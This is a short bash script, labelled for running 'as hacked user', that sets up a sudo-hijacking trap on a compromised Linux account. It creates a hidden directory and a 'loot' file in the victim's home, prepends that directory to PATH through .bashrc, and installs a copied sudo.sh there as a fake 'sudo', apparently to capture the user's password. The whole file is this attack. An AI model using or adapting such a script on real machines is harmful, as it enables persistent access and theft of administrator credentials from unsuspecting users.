#!/bin/bash

# Execute as hacked user

SECRET_PATH="/home/$USER/.h/.hidden"
LOOT="$SECRET_PATH/loot.txt"

mkdir -p $SECRET_PATH
touch $LOOT

echo "export PATH=$SECRET_PATH:$PATH" >> /home/$USER/.bashrc

cp sudo.sh $SECRET_PATH/sudo
chmod +x $SECRET_PATH/sudo
